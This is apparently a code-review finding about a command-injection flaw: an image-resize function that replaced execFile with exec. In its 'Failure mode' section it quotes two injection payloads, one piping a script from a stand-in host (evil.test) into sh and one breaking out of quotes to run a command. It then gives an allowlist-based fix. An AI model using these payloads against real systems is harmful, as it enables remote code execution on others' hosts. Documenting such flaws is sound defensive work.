findings.body:
**Issue:** `execFile` (no shell, argv-safe) was replaced with `exec`, and both `src` and `filter` are interpolated into a shell command string. Any caller-controlled value becomes shell syntax.

**Failure mode:** `filter` = `Lanczos; curl http://evil.test/pwn.sh | sh` or `src` = `x"; id > /tmp/pwned; echo "` executes arbitrary commands on the runner/host. Quoting `"${src}"` does not stop quote-breaking payloads; `filter` is unquoted entirely. The comment that `-filter` needs a shell is false — pass it as an argv element.

**Fix:** restore `execFile` / `spawn` with `shell: false` and an allowlisted filter:

```ts
import { execFile } from "child_process";

const ALLOWED_FILTERS = new Set(["Lanczos", "Mitchell", "Catrom", "Point", "Box"]);

export function resize(src: string, filter: string, w: number): Promise<string> {
  if (!ALLOWED_FILTERS.has(filter)) {
    return Promise.reject(new Error(`unsupported filter: ${filter}`));
  }
  if (!Number.isFinite(w) || w <= 0) {
    return Promise.reject(new Error("invalid width"));
  }
  return new Promise((res, rej) => {
    execFile("convert", [src, "-filter", filter, "-resize", `${w}x`, "/tmp/out.png"], (e) =>
      e ? rej(e) : res("/tmp/out.png")
    );
  });
}
```
